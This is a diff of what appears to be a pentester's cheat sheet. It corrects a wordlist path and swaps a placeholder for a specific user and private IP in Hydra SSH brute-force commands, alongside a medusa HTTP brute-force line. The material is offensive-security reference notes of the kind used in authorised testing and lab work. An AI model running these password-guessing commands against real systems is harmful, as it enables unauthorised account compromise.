@@ -179,8 +179,8 @@ medusa -h <targetip> -u admin -P mutated.txt -M http -n 80 -m DIR:/directory/to/
 
 Hydra
 
-hydra -l root -P /usr/share/wordlısts/rockyou.txt <targetip> ssh
-hydra -L userlist.txt -P /usr/share/wordlısts/rockyou.txt <targetip> -s 22 ssh -V
+hydra -l wilson -P /usr/share/wordlists/rockyou.txt 192.168.82.47 ssh
+hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt <targetip> -s 22 ssh -V
 
 # crack web passwords
 http-post-form can change as user module changes
